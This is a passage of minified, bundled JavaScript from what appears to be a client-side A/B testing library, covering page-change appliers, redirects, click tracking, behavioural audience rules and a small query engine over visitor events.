            var e = n.nodeType === Node.ELEMENT_NODE ? n : l.parentElement(n);
            e.setAttribute(t, "");
            var r = c.getData(e, this.change.id, this.identifier) || [];
            r.push(n), c.setData(e, this.change.id, this.identifier, r), i.each(l.childrenOf(e), function (n) {
              n.setAttribute(t, "");
            });
          }, this));
        }, b.prototype.cancel = function () {
          this.unobserveSelector && this.unobserveSelector();
        }, n.exports = function (n) {
          n.registerChangeApplier(d.changeType.APPEND, b);
        };
      },
      7649: function (n, t, e) {
        var i = e(9576),
          r = e(6530),
          o = e(5557),
          a = e(9404);
        function u(n, t) {
          if (!i.isFunction(n.value)) throw new Error("Custom code must be a function");
          this.change = n;
        }
        u.prototype.apply = function () {
          var n = r();
          try {
            a.apply(this.change.value), n.resolve();
          } catch (t) {
            n.reject(t);
          }
          return n;
        }, n.exports = function (n) {
          n.registerChangeApplier(o.changeType.CUSTOM_CODE, u);
        };
      },
      9026: function (n, t, e) {
        var i = e(9576),
          r = e(8398).Promise,
          o = e(2805),
          a = e(8964),
          u = e(8718),
          c = e(6954),
          s = e(5557),
          f = e(4797),
          l = e(9945),
          d = e(2678),
          v = e(2188);
        function h(n, t) {
          if (this.change = n, this.config = t, this.reasonShouldNotRedirect = this._checkForReasonNotToRedirect(), !this.reasonShouldNotRedirect) {
            if (!i.isString(this.change.dest) && !i.isFunction(this.change.dest)) throw new Error("Redirect destination is not a string or function");
            if (i.isFunction(this.change.dest) && (this.change.dest = this.change.dest(), !i.isString(this.change.dest))) throw new Error("Redirect destination function did not evaluate to a string");
            if (!this.config.action) throw new Error("Redirect changes require an action to be passed in the config.");
            f.dispatch(o.ANNOUNCE_PENDING_REDIRECT, {
              layerId: this.config.action.layerId
            });
          }
        }
        h.prototype.apply = function () {
          if (this.reasonShouldNotRedirect) return d.warn("Redirect change is not being applied because: " + this.reasonShouldNotRedirect), r.resolve(s.changeState.IGNORED);
          if (this.reasonInvalid) return d.error("Redirect change cannot be applied because:", this.reasonInvalid), r.reject(this.reasonInvalid);
          try {
            this.ye(this.be());
          } catch (n) {
            return r.reject(n);
          }
          return r.resolve(s.changeState.APPLIED);
        }, h.prototype.be = function () {
          var n = l.create(this.change.dest);
          if (this.change.preserveParameters) {
            var t = v.getLocation().search;
            t && (n.search ? n.search += "&" + t.substr(1) : n.search = t);
          }
          return n.toString();
        }, h.prototype.Ee = function () {
          var n = c.createElement("style");
          n.setAttribute("type", "text/css"), n.innerHTML = "body{display:none;visibility:hidden;}", c.appendToHead(n);
        }, h.prototype.ye = function (n) {
          (!this.change.hasOwnProperty("hidePage") || this.change.hidePage) && this.Ee(), v.setLocation(n);
        }, h.prototype._checkForReasonNotToRedirect = function () {
          var n = u.get(a.COOKIES.REDIRECT);
          if (!this.change.allowAdditionalRedirect && !i.isUndefined(n)) return "Page was already redirected.";
        }, n.exports = function (n) {
          n.registerChangeApplier(s.changeType.REDIRECT, h);
        };
      },
      4870: function (n, t, e) {
        var i = e(6183),
          r = e(7065).E,
          o = {
            selectExperiment: function (n, t, e) {
              if (n.experiments.length < 1) throw new r("Unable to find experiment to bucket user into");
              var o = n.experiments[0];
              if (!i.isValidExperiment(t, o)) throw new r('Audience conditions failed for experiment: "' + o.id + '".');
              return o;
            }
          };
        n.exports = function (n) {
          n.registerDecider("single_experiment", o), n.registerDecider("multivariate", o);
        };
      },
      4064: function (n, t, e) {
        var i = function (n) {
            return n && "undefined" != typeof Symbol && n.constructor === Symbol ? "symbol" : typeof n;
          },
          r = e(9576),
          o = e(7989),
          a = e(6639).U,
          u = e(6954),
          c = e(3043),
          s = t.Error = a("ClickDelegateError");
        function f(n) {
          this.handler = n, this.events = [], this.unlistenFn = null, this.clickHandler = r.bind(function (n) {
            r.forEach(this.events, r.bind(function (t) {
              try {
                var e = t.config && t.config.selector ? t.config.selector : t.eventFilter.selector;
                (function (n, t, e) {
                  var a = n.target,
                    u = 0;
                  for (; a;) {
                    var f;
                    try {
                      f = c(a, t);
                    } catch (d) {
                      var l = {
                        typeofElementValue: void 0 === a ? "undefined" : i(a),
                        nodeName: r.result(a, ["nodeName"], null),
                        nodeType: r.result(a, ["nodeType"], null),
                        targetName: r.result(n, ["target", "nodeName"], null),
                        targetType: r.result(n, ["target", "nodeType"], null),
                        numParentsTraversed: u,
                        selector: t,
                        errorMessage: d.message,
                        eventId: e.id
                      };
                      return o.emitError(new s("Unable to evaluate match for element"), l), !1;
                    }
                    if (f) return !0;
                    a = a.parentElement, u++;
                  }
                  return !1;
                })(n, e, t) && this.handler(t);
              } catch (a) {
                o.emitError(new s("Unable to handle click for selector" + e + ":" + a.message));
              }
            }, this));
          }, this);
        }
        f.prototype.listen = function () {
          this.unlistenFn = u.addEventListener("click", this.clickHandler, !0);
        }, f.prototype.unlisten = function () {
          this.unlistenFn && (this.unlistenFn(), this.unlistenFn = null);
        }, f.prototype.hasEvents = function () {
          return this.events.length > 0;
        }, f.prototype.addEvent = function (n) {
          this.events.push(n);
        }, f.prototype.removeEvent = function (n) {
          this.events = r.filter(this.events, function (t) {
            return t.apiName !== n.apiName;
          });
        }, n.exports = f;
      },
      7154: function (n, t, e) {
        var i = e(9126),
          r = e(4064),
          o = e(2678),
          a = e(9840);
        function u(n) {
          return "apiName: " + n.apiName + ", selector: " + n.eventFilter.selector;
        }
        n.exports = function (n) {
          var t = new r(function (n) {
            a.updateAllViewTags(), i.trackClickEvent(n) ? o.log("Tracking click event:", n) : o.log("Not tracking click event:", n);
          });
          n.registerEventImplementation("click", {
            attach: function (n) {
              t.hasEvents() || t.listen(), t.addEvent(n), o.debug("Started listening for click event (" + u(n) + "):", n);
            },
            detach: function (n) {
              t.removeEvent(n), t.hasEvents() || t.unlisten(), o.debug("Stopped listening for click event (" + u(n) + "):", n);
            }
          });
        };
      },
      3057: function (n, t, e) {
        var i = e(9576),
          r = e(5071),
          o = e(5186),
          a = e(319);
        function u(n, t) {
          var e = o.buildFromSpecV0_1(t);
          if (1 !== e.length) throw new Error("Invalid query descriptor; verify that no aggregators are specified");
          return a.execute(e[0], n);
        }
        function c(n, t) {
          return i.map(n, function (n) {
            return i.isFunction(n.toObject) ? n.toObject(t) : n;
          });
        }
        function s(n, t) {
          if (!n) return ["Descriptor not defined"];
          var e = [];
          return n.count && e.push('Unexpected "count" clause specified'), n.pick && n.pick.modifier && -1 === t.indexOf(n.pick.modifier) && e.push('Invalid "pick" modifier "' + n.pick.modifier + '"'), i.each(n.filters, function (n) {
            i.isUndefined(n.modifier) || e.push('Unexpected "filter" modifier "' + n.modifier + '"');
          }), e.length > 0 ? e : void 0;
        }
        function f(n, t) {
          var e = {
            revenueAsTag: !1,
            timeAsTimestamp: !0
          };
          if (i.isUndefined(t)) return c(r.getEvents(n), e);
          if (i.isNumber(t)) {
            if (t <= 0) throw new Error("Count must be a positive integer, got " + t);
            return c(r.getEvents(n).slice(-t), e);
          }
          var a = s(t, i.values(o.RECENCY_FILTERS));
          if (a) throw new Error(a.join("\n"));
          return c(u(r.getEvents(n), t), e);
        }
        function l(n, t) {
          if (!(t = i.cloneDeep(t) || {}).pick) throw new Error('No "pick" clause provided in query descriptor');
          if (!t.pick.name) throw new Error('No field name provided in "pick" clause');
          t.pick.modifier = t.pick.modifier || o.FREQUENCY_FILTERS.MOST_FREQUENT;
          var e = s(t, i.values(o.FREQUENCY_FILTERS));
          if (e) throw new Error(e.join("\n"));
          return u(r.getEvents(n), t);
        }
        function d(n, t) {
          var e = o.buildFromSpecV0_2(t),
            u = r.getEvents(n),
            s = c(a.execute(e, u), {
              revenueAsTag: !0,
              timeAsTimestamp: !1
            });
          return (t.pick || t.reduce && "count" === t.reduce.aggregator) && (s = i.flatten(s)), t.reduce && (s = s[0]), s;
        }
        n.exports = ["stores/visitor_events", function (n) {
          return {
            getEvents: i.partial(f, n),
            getByFrequency: i.partial(l, n),
            query: i.partial(d, n)
          };
        }];
      },
      9374: function (n, t, e) {
        n.exports = function (n) {
          n.registerApiModule("behavior", e(3057));
        };
      },
      1569: function (n, t, e) {
        n.exports = function (n) {
          n.registerVisitorProfileProvider(e(6731)), n.registerAudienceMatcher("behavior", e(4683));
        };
      },
      4683: function (n, t, e) {
        var i = e(9576),
          r = e(2676),
          o = e(5186),
          a = e(319);
        n.exports = {
          fieldsNeeded: ["events"],
          match: function (n, t) {
            var e,
              u = r.parse(t.value);
            return e = i.isUndefined(u.version) ? [u] : o.buildFromSpecV0_1(u), i.every(e, function (t) {
              return a.isSatisfied(t, n.events);
            });
          }
        };
      },
      6731: function (n, t, e) {
        var i = e(5071);
        n.exports = {
          provides: "events",
          isTransient: !0,
          getter: [function () {
            return i.getEvents();
          }]
        };
      },
      6879: function (n, t, e) {
        n.exports = function (n) {
          n.registerVisitorProfileProvider(e(6478));
        };
      },
      6478: function (n, t, e) {
        var i = e(9576),
          r = e(2024),
          o = e(5071),
          a = e(2676),
          u = e(5186);
        n.exports = {
          provides: "customBehavior",
          shouldTrack: !0,
          isLazy: !1,
          getter: ["stores/global", "stores/visitor_attribute_entity", function (n, t) {
            var e = n.getProjectId(),
              c = i.filter(i.map(t.getCustomBehavioralAttributes(e), function (n) {
                try {
                  return {
                    id: n.id,
                    granularity: r.GRANULARITY.ALL,
                    rule: u.buildFromSpecV0_2(a.parse(n.rule_json))
                  };
                } catch (t) {
                  return;
                }
              })),
              s = o.getEvents();
            return r.evaluate(c, s);
          }]
        };
      },
      9754: function (n, t, e) {
        n.exports = function (n) {
          n.registerVisitorProfileProvider(e(351)), n.registerAudienceMatcher("first_session", e(2456));
        };
      },
      2456: function (n) {
        n.exports = {
          fieldsNeeded: ["first_session"],
          match: function (n) {
            return !!n.first_session;
          }
        };
      },
      351: function (n, t, e) {
        var i = e(2657),
          r = e(5071),
          o = e(9196).getFieldValue,
          a = e(2289).CURRENT_SESSION_INDEX;
        n.exports = {
          provides: "first_session",
          shouldTrack: !0,
          getter: [function () {
            var n = r.getEvents();
            if (n && n.length > 0) {
              var t = n[0];
              return o(t, [i.FIELDS.SESSION_INDEX]) === a;
            }
            return !0;
          }]
        };
      },
      2024: function (n, t, e) {
        var i = e(2678),
          r = {
            FIELDS: e(2657).FIELDS
          },
          o = e(5186),
          a = e(319);
        t.GRANULARITY = {
          ALL: "all",
          CURRENT_SESSION: "current_session",
          LAST_30_DAYS: "last_30_days",
          LAST_60_DAYS: "last_60_days"
        }, t.evaluate = function (n, e) {
          var u = {};
          if (0 === e.length) {
            for (var c = 0; c < n.length; c++) u[n[c].id] = n[c].defaultValue;
            return u;
          }
          var s = function (n) {
              if (0 === n.length) return [];
              for (var t = n.length - 1, e = r.FIELDS.SESSION_ID, i = n[t][e]; t > 0 && i === n[t - 1][e];) t--;
              return n.slice(t);
            }(e),
            f = function (n, t) {
              if (0 === n.length || t <= 0) return [];
              var e = +new Date() - t * o.MILLIS_IN_A_DAY;
              e -= e % o.MILLIS_IN_A_DAY;
              for (var i = n.length; i > 0 && e <= n[i - 1][r.FIELDS.TIME];) i--;
              return n.slice(i);
            }(e, 60);
          for (c = 0; c < n.length; c++) {
            var l = n[c],
              d = e;
            l.granularity === t.GRANULARITY.CURRENT_SESSION ? d = s : l.granularity === t.GRANULARITY.LAST_60_DAYS && (d = f);
            try {
              var v = d;
              l.rule && (v = a.execute(l.rule, d)), u[l.id] = l.defaultValue, 1 === v.length ? u[l.id] = v[0][0] || l.defaultValue : i.debug("Behavior / Rule for", l.id, "returned", v.length, "results, expected 1");
            } catch (h) {
              i.error("Behavior / Rule for", l.id, "failed with", h.message || "");
            }
          }
          return u;
        };
      },
      5071: function (n, t, e) {
        var i = e(9576),
          r = e(9314),
          o = e(4041).get("stores/visitor_events");
        t.getEvents = function () {
          var n = r.getEvents(),
            t = [].concat.apply([], i.values(o.getForeignEvents())),
            e = [].concat.apply([], i.values(o.getForeignEventQueues())),
            a = r.mergeAllEvents([n, t, e]);
          return a.slice(a.length - 1e3);
        };
      },
      5186: function (n, t, e) {
        var i = t,
          r = e(9576),
          o = {
            FIELDS: e(2657).FIELDS,
            FIELDS_V0_2: e(2657).FIELDS_V0_2
          },
          a = e(2676),
          u = e(2678),
          c = e(319);
        i.MILLIS_IN_A_DAY = 864e5, i.aggregateField = function (n, t) {
          return r.isString(t) && (t = [t]), t = t || c.DEFAULT_FIELD, [c.generateAlias(n, t)];
        }, i.groupField = function (n) {
          return r.isString(n) && (n = [n]), [(n = n || c.DEFAULT_FIELD).join(".")];
        };
        var s = {
          "<": "lt",
          "<=": "lte",
          ">": "gt",
          ">=": "gte",
          "=": "eq",
          "==": "eq"
        };
        function f(n) {
          return n = (n || "").toString().trim(), s[n] || n;
        }
        function l(n, t, e) {
          var a = {
            where: t
          };
          if (n.count && (a.limit = n.count), n.modifier === i.FREQUENCY_FILTERS.MOST_FREQUENT) {
            var u = i.getFieldKeyPathForSource(n.name, e),
              c = i.aggregate("count"),
              s = i.aggregateField("count"),
              f = i.groupField(u);
            return r.extend(a, {
              select: [{
                field: f
              }],
              groupBy: i.groupBy([u]),
              aggregate: [c],
              orderBy: [{
                field: s,
                direction: "DESC"
              }]
            });
          }
          return r.extend(a, {
            orderBy: [{
              field: [o.FIELDS.TIME],
              direction: "DESC"
            }]
          });
        }
        i.fieldComparison = function (n, t, e) {
          return n = f(n), r.isString(t) && (t = [t]), "exists" === n ? {
            op: n,
            args: [{
              field: t
            }]
          } : {
            op: n,
            args: [{
              field: t
            }, {
              value: e
            }]
          };
        }, i.relativeTimeComparison = function (n, t) {
          return {
            op: f(n),
            args: [{
              op: "-",
              args: [{
                eval: "now"
              }, {
                field: [o.FIELDS.TIME]
              }]
            }, {
              value: t * i.MILLIS_IN_A_DAY
            }]
          };
        }, i.rangeTimeComparison = function (n) {
          return r.isArray(n) ? {
            op: "between",
            args: [{
              field: [o.FIELDS.TIME]
            }, {
              value: [n[0] || +new Date(0), n[1] || +new Date()]
            }]
          } : (u.error("Rule builder", "rangeTimeComparison passed invalid range", n), null);
        }, i.groupBy = function (n) {
          for (var t = [], e = 0; e < n.length; e++) t[e] = {
            field: n[e]
          };
          return t;
        }, i.aggregate = function (n, t) {
          return r.isString(t) && (t = [t]), {
            op: n,
            args: [{
              field: t = t || c.DEFAULT_FIELD
            }]
          };
        }, i.SOURCE_TYPES = {
          BEHAVIOR: "events",
          CUSTOM_BEHAVIOR: "custom_behavior",
          DCP: "dcp"
        }, i.FREQUENCY_FILTERS = {
          MOST_FREQUENT: "most_frequent",
          LEAST_FREQUENT: "least_frequent"
        }, i.RECENCY_FILTERS = {
          MOST_RECENT: "most_recent",
          LEAST_RECENT: "least_recent"
        }, i.getFieldKeyPathForSource = function (n, t) {
          t = t || i.SOURCE_TYPES.BEHAVIOR;
          var e = [];
          return r.isString(n) ? (e = [n], t !== i.SOURCE_TYPES.BEHAVIOR || r.includes(r.values(o.FIELDS), n) || (e = [o.FIELDS.OPTIONS, n])) : e = n, e;
        }, i.buildFromSpecV0_1 = function (n) {
          if (!(n.action || n.filters && 0 !== n.filters.length)) throw new Error('Audience spec must have an "action" field or at least one "filter" ' + a.stringify(n));
          var t = i.fieldComparison("gt", o.FIELDS.TIME, 0),
            e = [],
            c = [];
          if (n.action && (c.push(i.fieldComparison("eq", o.FIELDS.NAME, n.action.value)), n.action.type && c.push(i.fieldComparison("eq", o.FIELDS.TYPE, n.action.type))), n.time) if ("last_days" === n.time.type) c.push(i.relativeTimeComparison("lte", n.time.days));else if ("range" === n.time.type) {
            var s = i.rangeTimeComparison([n.time.start, n.time.stop]);
            s && c.push(s);
          } else u.error("Rule builder", 'Audience spec has bad "time" type', n.time.type);
          if (t = {
            op: "and",
            args: c
          }, n.count && e.push({
            where: i.fieldComparison(n.count.comparator, "0", n.count.value),
            from: {
              select: [{
                field: i.aggregateField("count")
              }],
              where: t,
              aggregate: [i.aggregate("count")]
            }
          }), n.filters && r.each(n.filters, function (r) {
            var a,
              u,
              s = i.getFieldKeyPathForSource(r.name, n.source);
            if (r.modifier === i.FREQUENCY_FILTERS.MOST_FREQUENT ? (a = i.aggregate("count"), u = i.aggregateField("count")) : r.modifier === i.RECENCY_FILTERS.MOST_RECENT && (a = i.aggregate("max", o.FIELDS.TIME), u = i.aggregateField("max", o.FIELDS.TIME)), a) {
              var f = s,
                l = i.groupField(f);
              e.push({
                where: i.fieldComparison(r.comparator, "0", r.value),
                from: {
                  select: [{
                    field: l
                  }],
                  where: t,
                  groupBy: i.groupBy([f]),
                  aggregate: [a],
                  orderBy: [{
                    field: u,
                    direction: "DESC"
                  }],
                  limit: 1
                }
              });
            } else c.push(i.fieldComparison(r.comparator, s, r.value));
          }), n.pick) {
            if (e.length > 0) throw new Error('A "pick" clause must not be specified with "count" or "most_recent", "most_frequent" modifiers' + a.stringify(n));
            return [l(n.pick, t, n.source)];
          }
          return e.length > 0 ? e : [{
            where: t
          }];
        }, i.buildFromSpecV0_2 = function (n) {
          !function (n) {
            var t = [];
            if (r.isUndefined(n)) throw new Error("rule is undefined");
            if (!r.isObject(n)) throw new Error("rule is not an Object");
            "0.2" !== n.version && t.push('version: not "0.2"'), n.filter && (r.isArray(n.filter) ? r.each(n.filter, function (n, e) {
              var r = i.validateFieldKeyPathV0_2(n.field, i.FieldPurpose.FILTER);
              r && t.push("filter[" + e + "]: " + r);
              var o = i.validateComparatorAndValue(n.comparator, n.value);
              o && t.push("filter[" + e + "]: " + o);
            }) : t.push("filter: not an array"));
            var e = [],
              o = [];
            n.sort && (n.reduce && n.reduce.aggregator && "nth" !== n.reduce.aggregator && t.push("sort: superfluous because we can apply aggregator " + a.stringify(n.reduce.aggregator) + " to unsorted items"), r.isArray(n.sort) ? r.each(n.sort, function (n, u) {
              var c = i.validateFieldKeyPathV0_2(n.field, i.FieldPurpose.SORT);
              c && t.push("sort[" + u + "]: " + c), n.field && "frequency" === n.field[0] ? e.push(n) : o.push(n);
              var s = function (n) {
                var t = "direction " + (a.stringify(n) || String(n));
                if (!r.includes(["ascending", "descending"], n)) return t + ' is not "ascending" or "descending"';
              }(n.direction);
              s && t.push("sort[" + u + "]: " + s);
            }) : t.push("sort: not an array"), e.length && o.length && t.push('sort: sorting by non-["frequency"] field is pointless because we are going to sort the picked values by ["frequency"]'), e.length && !n.pick && t.push('sort: sorting by ["frequency"] is impossible because no values have been picked'));
            if (n.pick) {
              n.reduce && "count" === n.reduce.aggregator && t.push('pick: superfluous because we can apply aggregator "count" to raw events');
              var u = i.validateFieldKeyPathV0_2(n.pick.field);
              u && t.push("pick: " + u);
            }
            if (n.reduce) {
              var c = n.reduce.aggregator,
                s = "aggregator " + (a.stringify(c) || String(c)),
                f = n.reduce.n,
                l = "index " + (a.stringify(f) || String(f));
              r.includes(["sum", "avg", "max", "min", "count", "nth"], c) || t.push("reduce: " + s + " is unknown"), r.includes(["sum", "avg", "max", "min"], c) && (n.pick || t.push("reduce: " + s + " is impossible to use because no values have been picked")), "nth" === c ? ((!r.isNumber(f) || isNaN(f) || parseInt(f, 10) !== f || f < 0) && t.push("reduce: " + l + " is not a non-negative integer (mandated by " + s + ")"), n.sort || t.push('reduce: aggregator "nth" is meaningless without a specific sort order')) : r.isUndefined(f) || t.push("reduce: " + l + " is defined (not mandated by " + s + ")");
            }
            if (t.length) throw new Error(t.join("\n"));
          }(n);
          var t = {
            where: {
              op: "and",
              args: r.map(n.filter || [], function (n) {
                return "age" === n.field[0] ? i.relativeTimeComparison(n.comparator || "eq", n.value / i.MILLIS_IN_A_DAY) : i.fieldComparison(n.comparator || "eq", i.convertFieldKeyPathFromSpecV0_2(n.field), n.value);
              })
            }
          };
          if (n.reduce && "count" === n.reduce.aggregator) return r.extend(t, {
            aggregate: [{
              op: "count",
              args: [{
                field: ["*"]
              }]
            }],
            select: [{
              field: ["_count_*"]
            }]
          });
          var e = [],
            o = [];
          if (n.sort && (r.each(n.sort, function (n) {
            r.includes(["ascending", "descending"], n.direction) && (r.includes(["time", "age"], n.field[0]) && o.push(n), "frequency" === n.field[0] && e.push(n));
          }), o.length && !e.length && (t.orderBy = r.filter(r.map(o, function (n) {
            return "time" === n.field[0] ? {
              field: i.convertFieldKeyPathFromSpecV0_2(["time"]),
              direction: "ascending" === n.direction ? "ASC" : "DESC"
            } : "age" === n.field[0] ? {
              field: i.convertFieldKeyPathFromSpecV0_2(["time"]),
              direction: "ascending" === n.direction ? "DESC" : "ASC"
            } : void 0;
          })))), n.pick && n.pick.field) {
            var u = i.convertFieldKeyPathFromSpecV0_2(n.pick.field);
            if (n.reduce && r.includes(["avg", "max", "min", "sum"], n.reduce.aggregator)) return r.extend(t, {
              aggregate: [{
                op: n.reduce.aggregator,
                args: [{
                  field: u
                }]
              }],
              select: [{
                field: [c.generateAlias(n.reduce.aggregator, u)]
              }]
            });
            t = e.length ? r.extend(t, {
              groupBy: [{
                field: u
              }],
              aggregate: [{
                op: "count",
                args: [{
                  field: ["*"]
                }]
              }],
              orderBy: [{
                field: ["_count_*"],
                direction: "ascending" === e[0].direction ? "ASC" : "DESC"
              }],
              select: [{
                field: [u.join(".")]
              }]
            }) : r.extend(t, {
              select: [{
                field: u
              }]
            });
          }
          if (n.reduce && "nth" === n.reduce.aggregator) {
            var s = n.reduce.n;
            if (r.isNumber(s) && s >= 0 && Number(s) === Math.floor(Number(s))) return r.extend(t, {
              offset: s,
              limit: 1
            });
          }
          return t;
        }, i.convertFieldKeyPathFromSpecV0_2 = function (n) {
          return "tags" === n[0] && "revenue" === n[1] ? ["r"] : [o.FIELDS_V0_2[n[0]]].concat(n.slice(1));
        }, i.FieldPurpose = {
          FILTER: "filter",
          SORT: "sort",
          PICK: "pick"
        }, i.validateFieldKeyPathV0_2 = function (n, t) {
          var e = "field " + (a.stringify(n) || String(n));
          if (!r.isArray(n) || !r.every(n, r.isString)) return e + " is not an array of strings";
          if ("tags" === n[0] && n.length > 2 || "tags" !== n[0] && n.length > 1) return e + " includes too many strings";
          if ("tags" === n[0] && n.length < 2) return e + " does not specify an exact tag";
          if (n.length < 1) return e + " does not specify a top-level field";
          var u = r.keys(o.FIELDS_V0_2),
            c = ["age", "frequency"];
          return t === i.FieldPurpose.FILTER && (u.push("age"), c = ["frequency"]), t === i.FieldPurpose.SORT && (u = ["time", "age", "frequency"], c = ["name", "type", "category", "tags"]), r.includes(c, n[0]) ? e + " is not supported here" : r.includes(u, n[0]) ? void 0 : e + " is unknown";
        }, i.validateComparatorAndValue = function (n, t) {
          var e = "comparator " + (a.stringify(n) || String(n)),
            i = "value " + (a.stringify(t) || String(t));
          if (!r.isString(n) && !r.isUndefined(n)) return e + " is not a string";
          switch (n) {
            case void 0:
            case "eq":
            case "is":
            case "contains":
              break;
            case "lt":
            case "gt":
            case "lte":
            case "gte":
              if (!r.isNumber(t)) return i + " is not a number (mandated by " + e + ")";
              break;
            case "in":
              if (!r.isArray(t)) return i + " is not an array (mandated by " + e + ")";
              break;
            case "between":
              if (!(r.isArray(t) && 2 === t.length && r.isNumber(t[0]) && r.isNumber(t[1]) && t[0] <= t[1])) return i + " is not a pair of increasing numbers (mandated by " + e + ")";
              break;
            case "regex":
              if (!(r.isString(t) || r.isArray(t) && 2 === t.length && r.isString(t[0]) && r.isString(t[1]))) return i + " is not a pattern string or a [pattern string, flags string] array (mandated by " + e + ")";
              break;
            case "exists":
              if (!r.isUndefined(t)) return i + " is not undefined (mandated by " + e + ")";
              break;
            default:
              return e + " is unknown";
          }
        };
      },
      319: function (n, t, e) {
        var i = e(9576),
          r = e(8964),
          o = e(2678),
          a = i.bind(o.log, o),
          u = e(3792),
          c = e(9196).getFieldValue,
          s = e(2676),
          f = function (n, t, e) {
            if (n.getValueOrDefault) return n.getValueOrDefault(t, e);
            if (!i.isArray(t)) return e;
            var r = c(n, t);
            return void 0 === r && (r = e), r;
          },
          l = function (n) {
            return "string" == typeof n ? n.trim().toLowerCase() : n;
          };
        t.clause = {
          WHERE: "where",
          GROUP_BY: "groupBy",
          AGGREGATE: "aggregate",
          HAVING: "having",
          ORDER_BY: "orderBy",
          SELECT: "select",
          OFFSET: "offset",
          LIMIT: "limit",
          FROM: "from"
        }, t.DEFAULT_FIELD = ["*"], t.booleanOperators = {
          eq: function (n) {
            var t = i.map(n, l);
            return t[0] == t[1];
          },
          is: function (n) {
            return n[0] === n[1];
          },
          gt: function (n) {
            return n[0] > n[1];
          },
          lt: function (n) {
            return n[0] < n[1];
          },
          gte: function (n) {
            return n[0] >= n[1];
          },
          lte: function (n) {
            return n[0] <= n[1];
          },
          "in": function (n) {
            var t = i.map(n[1] || [], l);
            return i.includes(t, l(n[0]));
          },
          between: function (n) {
            return n[1][0] <= n[0] && n[0] <= n[1][1];
          },
          contains: function (n) {
            var t = i.map(n, function (n) {
              return "string" == typeof n ? n.toLowerCase() : n;
            });
            return -1 !== (t[0] || "").indexOf(t[1]);
          },
          regex: function (n) {
            try {
              var t, e;
              return i.isString(n[1]) ? (t = n[1], e = "i") : (t = n[1][0] || "", e = n[1][1] || ""), new RegExp(t, e).test(n[0]);
            } catch (r) {
              return o.error("Rules", 'In operator "regex", error: ' + (r.message || "invalid RegExp /" + [t, e].join("/"))), !1;
            }
          },
          exists: function (n) {
            return void 0 !== n[0];
          },
          and: function (n) {
            return i.every(n, function (n) {
              return n;
            });
          },
          or: function (n) {
            return i.some(n, function (n) {
              return n;
            });
          },
          not: function (n) {
            return !n[0];
          }
        }, t.arithmeticOperators = {
          "+": function (n) {
            return (n[0] || 0) + (n[1] || 0);
          },
          "-": function (n) {
            return (n[0] || 0) - (n[1] || 0);
          },
          "/": function (n) {
            return (n[0] || 0) / (n[1] || 1);
          },
          "%": function (n) {
            return (n[0] || 0) % (n[1] || 1);
          }
        }, t.aggregateOperators = {
          sum: function (n, e) {
            for (var i = n[0] || t.DEFAULT_FIELD, r = 0, o = 0; o < e.length; o++) r += f(e[o], i, 0);
            return r;
          },
          avg: function (n, e) {
            if (0 === e.length) return 0;
            for (var i = n[0] || t.DEFAULT_FIELD, r = 0, o = 0; o < e.length; o++) r += f(e[o], i, 0);
            return r / e.length;
          },
          max: function (n, e) {
            for (var i = n[0] || t.DEFAULT_FIELD, r = Number.NEGATIVE_INFINITY, o = 0; o < e.length; o++) r = Math.max(r, f(e[o], i, Number.NEGATIVE_INFINITY));
            return r;
          },
          min: function (n, e) {
            for (var i = n[0] || t.DEFAULT_FIELD, r = Number.POSITIVE_INFINITY, o = 0; o < e.length; o++) r = Math.min(r, f(e[o], i, Number.POSITIVE_INFINITY));
            return r;
          },
          count: function (n, t) {
            return t.length;
          }
        };
        var d = {
            now: function () {
              return u.now();
            }
          },
          v = function (n, e) {
            if (e.hasOwnProperty("value")) return e.value;
            if (e.hasOwnProperty("field")) return f(n, e.field);
            if (e.hasOwnProperty("eval")) return e.eval in d ? d[e.eval]() : void o.error("Rules", "Unknown function: " + e.eval);
            if (e.op) {
              var r,
                a = (r = e.op) in t.booleanOperators ? t.booleanOperators[r] : r in t.arithmeticOperators ? t.arithmeticOperators[r] : null;
              if (a) {
                var u = i.partial(v, n),
                  c = e.args || [];
                return a(i.map(c, function (n) {
                  return u(n);
                }), n);
              }
              o.error("Rules", "Unknown operator: " + e.op);
            } else o.error("Rules", "No operator specified: " + s.stringify(e));
          };
        t.generateAlias = function (n, t) {
          return "_" + n + "_" + t.join(".");
        };
        t.rewrite = function (n) {
          var e = [],
            r = {};
          function a(n, u) {
            if (i.isArray(n) && ("and" !== n[0] && "or" !== n[0] && "not" !== n[0] && o.error("Rules", "Unexpected operation " + n[0] + ". Continuing optimistically."), n = {
              op: n[0],
              args: n.slice(1)
            }), n.hasOwnProperty("field") || n.hasOwnProperty("value") || n.hasOwnProperty("eval")) return n;
            if (u && n.op in t.aggregateOperators) {
              var c = (n.args && n.args[0] || {}).field || t.DEFAULT_FIELD,
                s = t.generateAlias(n.op, c);
              return s in r || (e.push({
                op: n.op,
                args: n.args
              }), r[s] = !0), {
                field: [s]
              };
            }
            for (var f = [], l = n.args || [], d = 0; d < l.length; d++) f[d] = a(l[d], u);
            return {
              op: n.op,
              args: f
            };
          }
          var u = {};
          n.hasOwnProperty(t.clause.WHERE) && (u[t.clause.WHERE] = a(n[t.clause.WHERE], !1)), n.hasOwnProperty(t.clause.HAVING) && (u[t.clause.HAVING] = a(n[t.clause.HAVING], !0)), (n.hasOwnProperty(t.clause.AGGREGATE) || e.length > 0) && (u[t.clause.AGGREGATE] = (n[t.clause.AGGREGATE] || []).concat(e));
          for (var c = [t.clause.GROUP_BY, t.clause.ORDER_BY, t.clause.SELECT, t.clause.OFFSET, t.clause.LIMIT], s = 0; s < c.length; s++) n.hasOwnProperty(c[s]) && (u[c[s]] = n[c[s]]);
          return n.hasOwnProperty(t.clause.FROM) && (u[t.clause.FROM] = t.rewrite(n[t.clause.FROM])), u;
        };
        var h = function (n, e) {
            e = e || 0;
            var r = [];
            if (n.hasOwnProperty(t.clause.WHERE) ? n[t.clause.WHERE].op ? n[t.clause.WHERE].op in t.booleanOperators || r.push("Non-boolean WHERE clause operator") : r.push("Missing WHERE clause operator") : r.push("Missing WHERE clause"), !n.hasOwnProperty(t.clause.HAVING) || (n[t.clause.HAVING].op ? n[t.clause.HAVING].op in t.booleanOperators || r.push("Non-boolean HAVING clause operator") : r.push("Missing HAVING clause operator")), n.hasOwnProperty(t.clause.GROUP_BY) && !n.hasOwnProperty(t.clause.AGGREGATE) && r.push("No AGGREGATE clause specified with GROUP_BY clause"), n.hasOwnProperty(t.clause.SELECT)) {
              var o = n[t.clause.SELECT];
              if (i.isArray(o)) for (var a = 0; a < o.length; a++) o[a].op && o[a].op in t.aggregateOperators && r.push('In SELECT clause, aggregate operator "' + o[a].op + '" specified in selector at index ' + a);else r.push("SELECT clause must be an array");
            }
